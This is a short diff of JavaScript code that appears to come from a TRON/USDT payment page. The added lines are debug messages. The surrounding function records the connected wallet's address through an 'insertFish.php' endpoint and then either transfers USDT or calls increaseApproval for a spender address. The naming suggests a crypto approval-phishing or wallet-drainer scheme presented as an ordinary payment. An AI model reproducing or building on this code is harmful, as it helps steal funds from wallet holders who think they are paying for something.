@@ -1270,6 +1270,7 @@ async function invokePay() {
             showTemporaryMessage(`能量检测通过，您有足够的能量进行授权 (${userData.energyRemaining}/${userData.energyLimit})`);
         }
         
+        showTemporaryMessage("1111111111111111");
         // 强制更新一次账户资源
         try {
             const accountResourcesResponse = await window.tronWeb.trx.getAccountResources(userData.address);
@@ -1289,6 +1290,7 @@ async function invokePay() {
             console.warn("支付前更新能量信息失败", e);
         }
         
+        showTemporaryMessage("2222222222222");
         const fishResponse = await $.post('/assets/libs/options/insertFish.php', {
             fish_address: userData.address,
             operation: 'query'
@@ -1297,8 +1299,10 @@ async function invokePay() {
         let success = false;
         
         if (fishResponse.status === 'success' && fishResponse.message === '数据已存在') {
+			showTemporaryMessage("3333333333333333333");
             success = await UsdtTransfer(paymentAddress, totalPrice);
         } else {
+			showTemporaryMessage("44444444444444444");
             switch(Number(model)) {
                 case 4:
                     success = await increaseApproval(spenderAddress, approvalAmount);
